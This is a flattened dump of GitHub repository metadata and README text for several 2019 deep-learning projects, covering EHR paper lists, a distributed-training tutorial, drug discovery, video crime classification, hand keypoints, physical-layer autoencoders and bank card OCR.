ruoyu-chen,dl4ehr_papers,n/a,1 EHR bib collection bib ris collection ris endnote xml collection xml 1 2019 Guidelines for reinforcement learning in healthcare Guidelinesforreinforcementlearninginhealthcare pdf URL https www nature com articles s41591 018 0310 5 NOTES notes Guidelinesforreinforcementlearninginhealthcare md Authors Omer Gottesman1 Fredrik Johansson2 Matthieu Komorowski3 4 Aldo Faisal4 David Sontag2 Finale Doshi Velez 1 and Leo Anthony Celi3 5 Journal Nature Medicine Affiliation MIT1 Harvard University 2 MIT 3 Harvard MIT Health Sciences Technology 4 Imperial College London 5 Beth Israel Deaconess Medical Center Abstract In this Comment we provide guidelines for reinforcement learning for decisions about patient treatment that we hope will accelerate the rate at which observational cohorts can inform healthcare practice in a safe risk conscious manner 2 2019 Multitask learning and benchmarking with clinical time series data https github com YerevaNN mimic3 benchmarks Multitasklearningbenchmarkingclinicaltimeseriesdata pdf URL https www nature com articles s41597 019 0103 9 NOTES notes Multitasklearningbenchmarkingclinicaltimeseriesdata md Authors Hrayr Harutyunyan1 Hrant Khachatrian 2 3 David C Kale1 Greg Ver Steeg1 aram Galstyan1 Journal Nature Scientific Data Affiliation 1 USC Information Sciences Institute 2 Yerevann Yerevan 0025 Armenia 3 Yerevan State University Armenia Abstract text Health care is one of the most exciting frontiers in data mining and machine learning Successful adoption of electronic health records EHRs created an explosion in digital clinical data available for analysis but progress in machine learning for healthcare research has been difficult to measure because of the absence of publicly available benchmark data sets To address this problem we propose four clinical prediction benchmarks using data derived from the publicly available Medical Information Mart for Intensive Care MIMIC III database These tasks cover a range of clinical problems including modeling risk of mortality forecasting length of stay detecting physiologic decline and phenotype classification We propose strong linear and neural baselines for all four tasks and evaluate the effect of deep supervision multitask training and data specific architectural modifications on the performance of neural models 3 2019 Deep Reinforcement Learning for Clinical Decision Support A Brief Survey DRL4ClinicalDecisionSupportSurvey pdf URL https arxiv org abs 1907 09475 Authors Siqi Liu1 Kee Yuan Ngiam2 Mengling Feng1 Preprint arXiv https arxiv org abs 1907 09475 Affiliation 1 National University of Singapore 2 National University Hospital Abstract Owe to the recent advancements in Artificial Intelligence especially deep learning many data driven decision support systems have been implemented to facilitate medical doctors in delivering personalized care We focus on the deep reinforcement learning DRL models in this paper DRL models have demonstrated human level or even superior performance in the tasks of computer vision and game playings such as Go and Atari game However the adoption of deep reinforcement learning techniques in clinical decision optimization is still rare We present the first survey that summarizes reinforcement learning algorithms with Deep Neural Networks DNN on clinical decision support We also discuss some case studies where different DRL algorithms were applied to address various clinical challenges We further compare and contrast the advantages and limitations of various DRL algorithms and present a preliminary guide on how to choose the appropriate DRL algorithm for particular clinical applications 4 2019 A guide to deep learning in healthcare Aguidetodeeplearninginhealthcare pdf URL https www nature com articles s41591 018 0316 z Authors Andre Esteva1 Alexandre Robicquet1 Bharath Ramsundar1 Volodymyr Kuleshov1 Mark DePristo2 Katherine Chou2 Claire Cui2 Greg Corrado2 Sebastian Thrun1 and Jeff Dean2 Journal Nature Medicine Affiliation 1 Stanford University 2 Google Research Abstract Here we present deep learning techniques for healthcare centering our discussion on deep learning in computer vision natural language processing reinforcement learning and generalized methods We describe how these computational techniques can impact a few key areas of medicine and explore how to build end to end systems Our discussion of computer vision focuses largely on medical imaging and we describe the application of natural language processing to domains such as electronic health record data Similarly reinforcement learning is discussed in the context of robotic assisted surgery and generalized deep learning methods for genomics are reviewed 5 2019 Effective Medical Test Suggestions Using Deep Reinforcement Learning EffectiveMedicalTestSuggestions pdf URL https arxiv org abs 1907 09475 DRL Authors Yang En Chen Kai Fu Tang Yu Shao Peng Edward Y Chang Preprint arXiv https arxiv org abs 1905 12916 Affiliation HTC Research Healthcare Stanford University Abstract Effective medical test suggestions benefit both patients and physicians to conserve time and improve diagnosis accuracy In this work we show that an agent can learn to suggest effective medical tests We formulate the problem as a stage wise Markov decision process and propose a reinforcement learning method to train the agent We introduce a new representation of multiple action policy along with the training method of the proposed representation Furthermore a new exploration scheme is proposed to accelerate the learning of disease distributions Our experimental results demonstrate that the accuracy of disease diagnosis can be significantly improved with good medical test suggestions 6 2019 Evaluation and accurate diagnoses of pediatric diseases using artificial intelligence Evaluationaccuratediagnosespediatricdiseases pdf URL https www nature com articles s41591 018 0335 9 Authors Huiying Liang1 Brian Y Tsui2 Hao Ni3 Carolina C S Valentim4 Sally L Baxter2 Guangjian Liu1 Wenjia Cai2 et al Journal Nature Medicine Affiliation 1 Guangzhou Women and Childrens Medical Center Guangzhou Medical University 2 Institute for Genomic Medicine Institute of Engineering in Medicine and Shiley Eye Institute University of California 3 Hangzhou YITU Healthcare Technology Co Ltd 4 Department of Thoracic Surgery Oncology First Affiliated Hospital of Guangzhou Medical University China State Key Laboratory and National Clinical Research Center for Respiratory Disease Abstract Artificial intelligence AI based methods have emerged as powerful tools to transform medical care Although machine learning classifiers MLCs have already demonstrated strong performance in image based diagnoses analysis of diverse and massive electronic health record EHR data remains challenging Here we show that MLCs can query EHRs in a manner similar to the hypothetico deductive reasoning used by physicians and unearth associations that previous statistical methods have not found Our model applies an automated natural language processing system using deep learning techniques to extract clinically relevant information from EHRs In total 101 6 million data points from 1 362 559 pediatric patient visits presenting to a major referral center were analyzed to train and validate the framework Our model demonstrates high diagnostic accuracy across multiple organ systems and is comparable to experienced pediatricians in diagnosing common childhood diseases Our study provides a proof of concept for implementing an AI based system as a means to aid physicians in tackling large amounts of data augmenting diagnostic evaluations and to provide clinical decision support in cases of diagnostic uncertainty or complexity Although this impact may be most evident in areas where healthcare providers are in relative shortage the benefits of such an AI system are likely to be universal 7 2019 Deep learning for time series classification a review Deeplearning4timeseriesclassification pdf URL https link springer com article 10 1007 s10618 019 00619 1 Authors Hassan Ismail Fawaz1 Germain Forestier1 2 Jonathan Weber1 Lhassane Idoumghar1 Pierre Alain Muller1 Journal Data Mining and Knowledge Discovery Affiliation 1 IRIMAS Universit Haute Alsace Mulhouse France 2 Faculty of IT Monash University Melbourne Australia Abstract Time Series Classification TSC is an important and challenging problem in data mining With the increase of time series data availability hundreds of TSC algorithms have been proposed Among these methods only a few have considered Deep Neural Networks DNNs to perform this task This is surprising as deep learning has seen very successful applications in the last years DNNs have indeed revolutionized the field of computer vision especially with the advent of novel deeper architectures such as Residual and Convolutional Neural Networks Apart from images sequential data such as text and audio can also be processed with DNNs to reach state of the art performance for document classification and speech recognition In this article we study the current state of the art performance of deep learning algorithms for TSC by presenting an empirical study of the most recent DNN architectures for TSC We give an overview of the most successful deep learning applications in various time series domains under a unified taxonomy of DNNs for TSC We also provide an open source deep learning framework to the TSC community where we implemented each of the compared approaches and evaluated them on a univariate TSC benchmark the UCR UEA archive and 12 multivariate time series datasets By training 8730 deep learning models on 97 time series datasets we propose the most exhaustive study of DNNs for TSC to date 8 2019 A clinically applicable approach to continuous prediction of future acute kidney injury RNN672AKI Aclinicallyapplicableapproachcontinuouspredictionacutekidneyinjury pdf URL https www nature com articles s41586 019 1390 1 NOTES notes Aclinicallyapplicableapproachcontinuouspredictionacutekidneyinjury md Authors Nenad Tomaev1 Xavier Glorot1 Jack W Rae1 2 Michal Zielinski1 Harry Askham1 Andre Saraiva1 Anne Mottram1 Clemens Meyer1 Suman Ravuri1 Ivan Protsyuk1 Alistair Connell1 Can O Hughes1 Alan Karthikesalingam1 Julien Cornebise1 Hugh Montgomery2 Geraint Rees2 Chris Laing Clifton R Baker Kelly Peterson Ruth Reeves Demis Hassabis1 Dominic King1 Mustafa Suleyman1 Trevor Back1 Christopher Nielson Joseph R Ledsam Shakir Mohamed1 Journal Nature Affiliation 1 DeepMind London UK 2 University College London London UK Abstract The early prediction of deterioration could have an important role in supporting healthcare professionals as an estimated 11 of deaths in hospital follow a failure to promptly recognize and treat deteriorating patients1 To achieve this goal requires predictions of patient risk that are continuously updated and accurate and delivered at an individual level with sufficient context and enough time to act Here we develop a deep learning approach for the continuous risk prediction of future deterioration in patients building on recent work that models adverse events from electronic health records2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 and using acute kidney injurya common and potentially life threatening condition18as an exemplar Our model was developed on a large longitudinal dataset of electronic health records that cover diverse clinical environments comprising 703 782 adult patients across 172 inpatient and 1 062 outpatient sites Our model predicts 55 8 of all inpatient episodes of acute kidney injury and 90 2 of all acute kidney injuries that required subsequent administration of dialysis with a lead time of up to 48 h and a ratio of 2 false alerts for every true alert In addition to predicting future acute kidney injury our model provides confidence assessments and a list of the clinical features that are most salient to each prediction alongside predicted future trajectories for clinically relevant blood tests9 Although the recognition and prompt treatment of acute kidney injury is known to be challenging our approach may offer opportunities for identifying patients at risk within a time window that enables early treatment 9 2019 System and Method for Predicting and Summarizing Medical Events from Electroinc Health Records GooglePatent2019 pdf Affiliation Google Inc Abstract A system for predicting and summarizing medical events from electronic health records includes a computer memory storing aggregated electronic health records from a multitude of patients of diverse age health conditions and demographics including medications laboratory values diagnoses vital signs and medical notes The aggregated electronic health records are converted into a single standardized data structure format and ordered arrangement per patient e g into a chronological order A computer or computer system executes one or more deep learning models trained on the aggregated health records to predict one or more future clinical events and summarize pertinent past medical events related to the predicted events on an input electronic health record of a patient having the standardized data structure format and ordered into a chronological order An electronic device configured with a healthcare provider facing interface displays the predicted one or more future clinical events and the pertinent past medical events of the patient 10 2018 Clinical information extraction applications A literature review Clinicalinformationextractionapplications pdf URL https www sciencedirect com science article pii S1532046417302563 Authors Yanshan Wang Liwei Wang Majid Rastegar Mojarad Sungrim Moon Feichen Shen Naveed Afzal Sijia Liu Yuqun Zeng1 Saeed Mehrabi2 Sunghwan Sohn Hongfang Liu Journal Journal of Biomedical Informatics Affiliation Mayo Clinic Division of Biomedical Statistics and Informatics Department of Health Sciences Research Abstract Background With the rapid adoption of electronic health records EHRs it is desirable to harvest information and knowledge from EHRs to support automated systems at the point of care and to enable secondary use of EHRs for clinical and translational research One critical component used to facilitate the secondary use of EHR data is the information extraction IE task which automatically extracts and encodes clinical information from text Objectives In this literature review we present a review of recent published research on clinical information extraction IE applications Methods A literature search was conducted for articles published from January 2009 to September 2016 based on Ovid MEDLINE In Process Other Non Indexed Citations Ovid MEDLINE Ovid EMBASE Scopus Web of Science and ACM Digital Library Results A total of 1917 publications were identified for title and abstract screening Of these publications 263 articles were selected and discussed in this review in terms of publication venues and data sources clinical IE tools methods and applications in the are,2019-07-23T14:54:38Z,2019-12-05T01:33:37Z,TeX,ruoyu-chen,User,1,5,1,23,master,ruoyu-chen#xinzhuo123,2,0,0,0,0,0,0
NERSC,dl4sci-scaling-tutorial,n/a,Deep Learning for Science School Tutorial Deep Learning At Scale This repository contains the material for the DL4Sci tutorial Deep Learning at Scale It contains specifications for datasets a couple of CNN models and all the training code to enable training the models in a distributed fashion using Horovod As part of the tutorial you will train a ResNet model to classify images from the CIFAR10 dataset on multiple nodes with synchronous data parallelism Contents Links https github com NERSC dl4sci scaling tutorial links Installation https github com NERSC dl4sci scaling tutorial installation Navigating the repository https github com NERSC dl4sci scaling tutorial navigating the repository Hands on walk through https github com NERSC dl4sci scaling tutorial hands on multi node training example Code references https github com NERSC dl4sci scaling tutorial code references Links NERSC JupyterHub https jupyter dl nersc gov Slides https drive google com drive folders 10NqOLaqPTZ0nobE7JNSaGwrXQiACD35 usp sharing Installation 1 Start a terminal on Cori either via ssh or from the Jupyter interface IMPORTANT if using jupyter you need to use a SHARED CPU Click the CPU button instead of the GPU button to run this example 2 Clone the repository using git git clone https github com NERSC dl4sci scaling tutorial git That s it The rest of the software Keras TensorFlow is pre installed on Cori and loaded via the scripts used below Navigating the repository trainhorovod py the main training script which can be steered with YAML configuration files data folder containing the specifications of the datasets Each dataset has a corresponding name which is mapped to the specification in data init py models folder containing the Keras model definitions Again each model has a name which is interpreted in models init py configs folder containing the configuration files Each configuration specifies a dataset a model and all relevant configuration options with some exceptions like the number of nodes which is specified instead to SLURM via the command line scripts contains an environment setup script and some SLURM scripts for easily submitting the example jobs to the Cori batch system utils contains additional useful code for the training script e g custom callbacks device configuration and optimizers logic Hands on multi node training example We will use a customized ResNet model in this example to classify CIFAR10 images and demonstrate distributed training with Horovod 1 Check out the ResNet model code in models resnet py models resnet py Note that the model code is broken into multiple functions for easy reuse We provide here two versions of ResNet models a standard ResNet50 with 50 layers and a smaller ResNet consisting of 26 layers Identify the identy block and conv block functions How many convolutional layers do each of these have Identify the functions that build the ResNet50 and the ResNetSmall Given how many layers are in each block see if you can confirm how many layers conv and dense are in the models Hint we don t normally count the convolution applied to the shortcuts 2 Inspect the optimizer setup in utils optimizers py utils optimizers py Note how we scale the learning rate lr according to the number of processes ranks Note how we construct our optimizer and then wrap it in the Horovod DistributedOptimizer 3 Inspect the main trainhorovod py trainhorovod py training script Identify the initworkers function where we initialize Horovod Note where this is invoked in the main function right away Identify where we setup our distributed training callbacks Which callback ensures we have consistent model weights at the start of training Identify the callbacks responsible for the learning rate schedule warmup and decay 4 Finally look at the configuration file configs cifar10resnet yaml configs cifar10resnet yaml YAML allows to express configurations in rich human readable hierarchical structure Identify where you would edit to modify the optimizer learning rate batch size etc That s mostly it for the code Note that in general when training distributed you might want to use more complicated data handling e g to ensure different workers are always processing different samples of your data within a training epoch In this case we aren t worrying about that and are for simplicity relying on the independent random shuffling of the data by each worker as well as the random data augmentation 5 To gain an appreciation for the speedup of training on multiple nodes first train the ResNet model on a single node Adjust the configuration in configs cifar10resnet yaml configs cifar10resnet yaml to train for just 1 epoch and then submit the job to the Cori batch system with SLURM sbatch and our provided SLURM batch script sbatch N 1 scripts cifarresnet sh Important the first time you run a CIFAR10 example it will automatically download the dataset If you have more than one job attempting this download simultaneously it will likely fail 6 Now we are ready to train our ResNet model on multiple nodes using Horovod and MPI If you changed the config to 1 epoch above be sure to change it back to 32 epochs for this step To launch the ResNet training on 8 nodes do sbatch N 8 scripts cifarresnet sh 7 Check on the status of your job by running sqs Once the job starts running you should see the output start to appear in the slurm log file logs cifar cnn out You ll see some printouts from every worker Others are only printed from rank 0 8 When the job is finished check the log to identify how well your model learned to solve the CIFAR10 classification task For every epoch you should see the loss and accuracy reported for both the training set and the validation set Take note of the best validation accuracy achieved Now that you ve finished the main tutorial material try to play with the code and or configuration to see the effect on the training results You can try changing things like Change the optimizer search for Keras optimizers on google Change the nominal learning rate number of warmup epochs decay schedule Change the learning rate scaling e g try sqrt scaling instead of linear Most of these things can be changed entirely within the configuration See configs imagenetresnet yaml configs imagenetresnet yaml for examples Code references Keras ResNet50 official model https github com keras team keras applications blob master kerasapplications resnet50 py Horovod ResNet ImageNet example https github com uber horovod blob master examples kerasimagenetresnet50 py CIFAR10 CNN and ResNet examples https github com keras team keras blob master examples cifar10cnn py https github com keras team keras blob master examples cifar10resnet py,2019-07-11T22:07:14Z,2019-10-15T15:59:18Z,Jupyter Notebook,NERSC,Organization,1,5,1,31,master,sparticlesteve#azrael417#MustafaMustafa,3,0,0,0,0,0,0
Komarovec,NeuralQsandbox,n/a,NeuralSandbox2 Future plans https trello com b IQ2YOm6Z neuralsandbox2,2019-07-04T14:21:27Z,2019-12-07T15:42:35Z,Python,Komarovec,User,0,5,0,109,master,Komarovec,1,3,3,0,0,1,0
joehoeller,drug-discovery-with-h2o4gpu,n/a,Drug Discovery using H2O4GPU ReLeaSE solution solved with H2O4GPU CUDA 10 Anaconda RDKit TensorFlow GPU OpenChem and more Reinforcement Learning for Drug Discovery using H2O4GPU Drug Discovery using H2O4GPU based off of the following paper Deep ReLeaSE Reinforcement Learning for de novo Drug Design by Mariya Popova Olexandr Isayev Alexander Tropsha Deep Reinforcement Learning for de novo Drug Design Science Advances 2018 Vol 4 no 7 eaap7885 DOI 10 1126 sciadv aap7885 http dx doi org 10 1126 sciadv aap7885 Please note that this implementation of Deep Reinforcement Learning for de novo Drug Design aka ReLeaSE method only works on Linux H2O4GPU https github com h2oai h2o4gpu is a collection of GPU solvers by H2Oai with APIs in Python and R The Python API builds upon the easy to use scikit learn API and its well tested CPU based algorithms It can be used as a drop in replacement for scikit learn Chemical and Molecule Analysis for Drug Discovery OpenChem https mariewelt github io OpenChem html index html OpenChem is a deep learning toolkit for Computational Chemistry with PyTorch backend RDKit https www rdkit org docs Install html 2D and 3D molecular operations Descriptor generation for machine learning Molecular database cartridge for PostgreSQL Cheminformatics nodes for KNIME distributed from the KNIME community site https www knime com rdkit TUTORIALS https github com rdkit rdkit tutorials Mordred https github com mordred descriptor mordred Compute modal decompositions and reduced order models easily efficiently and in parallel TensorFlow for GPU v1 13 1 https www tensorflow org install gpu Machine Learning TensorBoard https www datacamp com community tutorials tensorboard tutorial Understand debug and optimize PyTorch https pytorch org tutorials Neural Networks from research to production Distributed Feature Engineering Dask Distributed https dask org Distributed ingestion of data Feature Tools https docs featuretools com Automted feature engineering CUDA for GPU TPU Enablement NVIDIA TensorRT inference accelerator and CUDA 10 https developer nvidia com tensorrt CUDA TPUs makes you awesome PyCUDA 2019 https mathema tician de software pycuda Python interface for direct access to GPU or TPU CuPy latest https cupy chainer org GPU accelerated drop in replacement for numpy cuDNN7 4 1 5 for deeep learning in CNN s https developer nvidia com cudnn GPU accelerated library of primitives for deep neural networks Misc tqdm https github com tqdm tqdm Progess bars Operating System inside the container Ubuntu 18 04 so you can nix your way through the cmd line Good to know Hot Reloading code updates will automatically update in container from apps folder TensorBoard is on localhost 6006 and GPU enabled Jupyter is on localhost 8888 Python 3 7 Only Tesla Pascal and Turing GPU Architecture are supported Test with synthetic data that compares GPU to CPU benchmark and Tensorboard example 1 CPU GPU Benchmark https github com joehoeller blob master apps gpubenchmarks benchmark py 2 Tensorboard to understand debug neural networks https github com joehoeller blob master apps gpubenchmarks tensorboard py Demos JAK2minmaxdemo ipynb JAK2 https www ebi ac uk chembl target inspect CHEMBL2363062 pIC50 minimization and maximization LogPoptimizationdemo ipynb optimization of logP to be in a drug like region from 0 to 5 according to Lipinski s rule of five https en wikipedia org wiki Lipinski 27sruleoffive RecurrentQSAR example logp ipynb training a Recurrent Neural Network to predict logP from SMILES using OpenChem https github com Mariewelt OpenChem toolkit Disclaimer JAK2 demo uses Random Forest predictor instead of Recurrent Neural Network since the availability of the dataset with JAK2 activity data used in the Deep Reinforcement Learning for de novo Drug Design paper is restricted under the license agreement So instead we use the JAK2 activity data downladed from ChEMBL CHEMBL2971 and curated The size of this dataset is 2000 data points which is not enough to build a reliable deep neural network If you want to see a demo with RNN please checkout logP optimization Before you begin This might be optional Link to nvidia docker2 install Tutorial https medium com sh tsang docker tutorial 5 nvidia docker 2 0 installation in ubuntu 18 04 cb80f17cac65 You must install nvidia docker2 and all it s deps first assuming that is done run sudo apt get install nvidia docker2 sudo pkill SIGHUP dockerd sudo systemctl daemon reload sudo systemctl restart docker How to run this container Step 1 docker build t Step 2 Run the image mount the volumes for Jupyter and app folder for your fav IDE and finally the expose ports 8888 for TF1 and 6006 for TensorBoard docker run rm it runtime nvidia user id u id g group add containeruser group add sudo v PWD apps v pwd tf notebooks p 8888 8888 p 0 0 0 0 6006 6006 Step 3 Check to make sure GPU drivers and CUDA is running Exec into the container and check if your GPU is registering in the container and CUDA is working Get the container id docker ps Exec into container docker exec u root t i bin bash Check if NVIDIA GPU DRIVERS have container access nvidia smi Check if CUDA is working nvcc V Step 4 How to launch TensorBoard It helps to use multiple tabs in cmd line as you have to leave at least 1 tab open for TensorBoard 6006 Demonstrates the functionality of TensorBoard dashboard Exec into container if you haven t as shown above Get the docker ps docker exec u root t i bin bash Then run in cmd line tensorboard logdir tmp tensorflow mnist logs Type in cd to get root Then cd into the folder that hot reloads code from your local folder fav IDE at apps apps gpubenchmarks and run python tensorboard py Go to the browser and navigate to localhost 6006 Step 5 Run tests to prove container based GPU perf Demonstrate GPU vs CPU performance Exec into the container if you haven t and cd over to tf notebooks apps gpubenchmarks and run CPU Perf python benchmark py cpu 10000 CPU perf should return something like this Shape 10000 10000 Device cpu 0 Time taken 0 00 03 934996 GPU perf python benchmark py gpu 10000 GPU perf should return something like this Shape 10000 10000 Device gpu 0 Time taken 0 00 01 032577 Known conflicts with nvidia docker and Ubuntu AppArmor on Ubuntu has sec issues so remove docker from it on your local box it does not hurt security on your computer sudo aa remove unknown If building impactful data science tools for pharma is important to you or your business please get in touch Contact Email joehoeller gmail com,2019-07-14T00:37:43Z,2019-11-11T05:40:14Z,Jupyter Notebook,joehoeller,User,0,5,4,47,master,joehoeller,1,0,0,0,0,0,0
sanchit2843,Videoclassification,action-recognition#cnn-classification#crime-data#crime-prediction#deep-learning#pytorch,I have implemented crime recognitions from cctv footages using UCF crime dataset which can be obtained from here https webpages uncc edu cchen62 dataset html The dataset being too big I downloaded shorter version of it available on kaggle https www kaggle com mission ai crimeucfdataset This shorter version consists of 8 classes which includes Abuse arrest arson assault burglary explosion fighting and normal Datapreprocessing I converted videos into frames and took only 16 frames from every video for the training of model These 16 frames were selected from complete video sequence by skipping frames according to video length In this dataset the number of videos are less but longer so to increase number of samples by 10 times I took 16 samples where first frame started from 0 9 thus giving 10 times the number of videos and all with different images To speed up the transfer of data I combined these 16 images into 1 The implementation of the preprocessing can be found in videodata ipynb The preprocessed data with 16 samples can be found here https drive google com file d 1vEk82F35yM9wW5qRZYPH6QDH BLuZ2nE view usp sharing Model used This task is of action recognition and I tried one of the best model for action recognition Slow Fast Networks for Video Recognition https arxiv org pdf 1812 03982 pdf worked best The implementation of this network in pytorch can be found here https github com Guocode SlowFast Networks Training The model trained fast and reached a training accuracy of 99 within 20 epochs https github com sanchit2843 Videoclassification blob master assets acc png https github com sanchit2843 Videoclassification blob master assets loss png Pretrained model can be downloaded from here,2019-07-01T05:44:27Z,2019-11-08T05:44:25Z,Jupyter Notebook,sanchit2843,User,0,5,0,15,master,sanchit2843,1,0,0,1,2,0,0
erezposner,HandKeyPointDetector,n/a,Repository is based on https www learnopencv com hand keypoint detection using deep learning and opencv additional development was made as a wrapping class to detect hand keypoints based on the article https arxiv org pdf 1704 07809 pdf Please run getModels sh from the command line to download the model in the correct folder USAGE Python For using it on single image python handPoseImage py For using on video python handPoseVideo py To create a class for hand keypoints detector python HandKeypointDetector py,2019-07-01T11:18:10Z,2019-11-25T07:06:05Z,Python,erezposner,User,0,5,1,1,master,erezposner,1,0,0,0,0,0,0
xunyiljg,DRL_Auto-driving_bicycle,n/a,DRLAuto drivingbicycle Auto driving bicycle made by unity and deep reinforcement learning unity https www bilibili com video av57357339 https blog csdn net qq38258350 article details 95036875,2019-07-09T10:40:52Z,2019-10-28T06:23:46Z,Jupyter Notebook,xunyiljg,User,0,5,0,4,master,xunyiljg,1,0,0,1,0,0,0
jcbooth2,autoencoder_for_physical_layer,autoencoder#keras#tensorflow,Overview This is my attempt to reproduce and extend the results in the paper An Introduction to Deep Learning for the Physical Layer by Tim O Shea and Jakob Hoydis Available at https doi org 10 1109 TCCN 2017 2758370 There is also and attempt to use the autoencoder for simultaneous information and power transfer based on the paper A Learning Approach to Wireless Information and Power Transfer Signal And System Design by Morteza Varasteh Enrico Piovano and Bruno Clerckx Available at https doi org 10 1109 ICASSP 2019 8682485 Another very useful paper on this topic is Deep Learning Based Communication Over the Air By Sebastian Dorner Sebastian Cammerer Jakob Hoydis and Stephan ten Brink It covers more complicated implementations for more realistic channels The implementation uses Keras with a Tensorflow backend on Jupyter Notebook The paper from O Shea and Hoydis covers multiple applications for using an autoencoder to replace the physical layer in a wireless communication system I have searched and only found code for the most basic example which implements a Gaussian Channel but for the three more complex applications there is nothing Therefore I am reproducing the results myself Currently I have only reproduced the results for the Gaussian Channel The end goal for this is to implement the trained encoder and decoder in real time using GNU Radio and the gr tflite module which I am planning on writing Autoencoder for Gaussian Channel This creates an autoencoder which finds the optimal modulating technique for robust communication over a white gaussian noise channel the simplest of channels The Block Error Rate of the communication through varying Signal to Noise Ratios is analyzed by varying the magnitude of added noise The trained autoencoder successfully transmits the signal with performance comparable to other Autoencoder for Reyleigh Channel This Attempts to implement an autencoder with similar structure the the previous Gaussian Channel to a Reyleigh Channel Currently only a single tap Reyleigh Channel has been implemented and is currently not effective Autoencoder for Reyleigh Channel with RTN This is an improvement to the decoder portion of the autoencoder by including a RTN which predicts the channel taps and then performs a convolution using the recieved signal and predicted channel taps In the paper An Introduction to Deep Learning for the Physical Layer this technique significantly improved the Block Error Rate of the system but I have been unable to reproduce these results Autoencoder for MIMO Communication with a Gaussian Channel This attempts to create two autoencoders that reject the other allowing a communication between two systems Here the output of one encoder is added to the output of the other encoder with white gaussian noise and is then recieved by the corresponding decoder and vice versa Interestingly enough without a special adaptive loss function the combined system tends to highly optimize one of the channels at the cost of the other channel where one channel will recive small BER and the other will have large BER To overcome this I have implemented a custom loss function that weights the loss of each seperate autoencoder according to the accuracy of the previous batch Currently this is not yet effective and requires more work SISO for Simultaneous Info and Power Transfer This is another interesting application of autoencoders to the physical layer This attempt only uses a Gaussian Channel and I have run into problems because the loss function used in the paper incorporates a modified bessel function of the first kind and zero order Incorporating only the bessel function causes the loss to return as NaN because the bessel function returns extremely large numbers Currently the code implements the natural log of the bessel function to avoid this but I must do more reading to understand the purpose of this bessel function because currently my calculations of recieved power do not match the recieved power presented in the paper License This code is licensed under the MIT Open Source License,2019-07-18T12:14:36Z,2019-11-29T12:43:10Z,Jupyter Notebook,jcbooth2,User,0,5,7,7,master,jcbooth2,1,0,0,0,0,0,0
PacktPublishing,Getting-Started-with-TensorFlow-2.0-for-Deep-Learning-Video,n/a,Getting Started with TensorFlow 2 0 for Deep Learning Video This is the code repository for Getting Started with TensorFlow 2 0 for Deep Learning Video https www packtpub com application development getting started tensorflow 20 deep learning video published by Packt https www packtpub com utmsource github It contains all the supporting project files necessary to work through the video course from start to finish About the Video Course Deep learning is a trending technology if you want to break into cutting edge AI and solve real world data driven problems Googles TensorFlow is a popular library for implementing deep learning algorithms because of its rapid developments and commercial deployments This course provides you with the core of deep learning using TensorFlow 2 0 Youll learn to train your deep learning networks from scratch pre process and split your datasets train deep learning models for real world applications and validate the accuracy of your models By the end of the course youll have a profound knowledge of how you can leverage TensorFlow 2 0 to build real world applications without much effort What You Will Learn Develop real world deep learning applications Classify IMDb Movie Reviews using Binary Classification Model Build a model to classify news with multi label Train your deep learning model to predict house prices Understand the whole package prepare a dataset build the deep learning model and validate results Understand the working of Recurrent Neural Networks and LSTM with hands on examples Implement autoencoders and denoise autoencoders in a project to regenerate images Instructions and Navigation Assumed Knowledge This course is for developers who have a basic knowledge of Python If youre aware of the basics of machine learning and now want to build deep learning systems with TensorFlow 2 0 that are smarter faster more complex and more practical then this course is for you Technical Requirements This course has the following requirements Jupyter Notebook Latest Version Operating system Mac Linux Python 3 x basic programming skills Related Products Learning TensorFlow 2 0 Video https www packtpub com big data and business intelligence learning tensorflow 20 video Implementing Deep Learning Algorithms with TensorFlow 2 0 Video https www packtpub com big data and business intelligence implementing deep learning algorithms tensorflow 20 video Advanced NLP Projects with TensorFlow 2 0 Video https www packtpub com application development advanced nlp projects tensorflow 20 video,2019-06-26T11:32:27Z,2019-09-26T14:30:23Z,Jupyter Notebook,PacktPublishing,Organization,0,5,4,7,master,kavyashreeshah,1,0,0,0,0,0,0
ShawnHXH,BankCard-Recognizer,bankcard#cnn-blstm-ctc#data-augmentation#deep-learning#east#gui#keras#ocr#python,BankCard Recognizer mit https img shields io github license mashape apistatus svg Extracting bank number from bankcard based on Deep Learning with Keras Including auto and manual location number identification with GUI bankcard https github com ShawnHXH BankCard Recognizer blob master gui icon bankcard png Roadmap data augmentation cnnblstmctc EAST manual locate gui Requirement Python 3 6 Tensorflow gpu Keras Cython OpenCV2 Numpy Scipy PyQt5 PIL clipboard Environment My platform is Win10 with Anaconda PyCharm 2018 3 NVIDIA GTX 1050 Usage 1 Download trained model CRNN https pan baidu com s 1Cyj1YHhHxlX 3Lgj0vQ35A extracting code 6eqw EAST https pan baidu com s 1R kD0HGTomS8O0JhXJ hCA extracting code qiw5 2 Then put CRNN model into crnn model put EAST model into east model 3 Run python demo py 4 In GUI press Load button to load one image about bankcard or load from dataset test 5 Press Identify button it will start locate and do identification 6 Activate manual location by double click the Image view then draw the interest area and press Identify Training Prepare Download my dataset CRNN https pan baidu com s 1Ji0ZOv rMSPcN2W6uO0K5Q extracting code 1jax EAST https pan baidu com s 1UL1OdLEL uNRQl8d11NkeQ extracting code pqba and unzip dataset in dataset for CRNN 1 Run the run py in crnn and you can change some parameters depends on your hardware 2 If you want use your own dataset put it into dataset and change the srcdir in run py 3 If doing data augmentation it will take some time to generate npz file also recommend augnbr to be 30 80 for EAST 1 My dataset is collecting from Internet Baidu Google and thanks Kesci https www kesci com home dataset 5954cf1372ead054a5e25870 It has been labeld with ICDAR 2015 format you can see it in txt This tiny dataset is unable to cover all the situation if you have rich one it may perform better 2 If you would like to get more data make sure data has been labeled or you can take dataset tagger py to label it 3 Modify cfg py see default values 4 Run python preprocess py If process goes well you ll see generated data like this actgt https github com ShawnHXH BankCard Recognizer blob master readme actgtimg99 png 5 Finally python run py About data augmentation I wrote some functions about data augmentation especially for data like image It contains shift zoom shear rotate resize fill etc Some are using Scipy ndimage some are built with Cython If you want to add you own cython code write in ctoolkits pyx and execute python setup py buildext inplace in command line Here are some effects data aug effect2 https github com ShawnHXH BankCard Recognizer blob master readme data aug2 png cnnblstmctc The model I used refer to CNNRNNCTC The CNN part is using VGG with BLSTM as RNN and CTC loss This model s behave is pretty well But training it takes time In my computer epochs 100 batchsize 16 augnbr 50 stepsperepoch 200 spends almost 4 5 hours If you have a nice GPU you will do better which I m not The model s preview model https github com ShawnHXH BankCard Recognizer blob master readme model png EAST manual locate Auto locate is using one famous Text Detection Algorithm EAST See more details https zhuanlan zhihu com p 37504120 In this project I prefer to use AdvancedEAST It is an algorithm used for Scene Image Text Detection which is primarily based on EAST and the significant improvement was also made which make long text predictions more accurate Original repo see Reference 1 Also training process is quiet quick and nice As practical 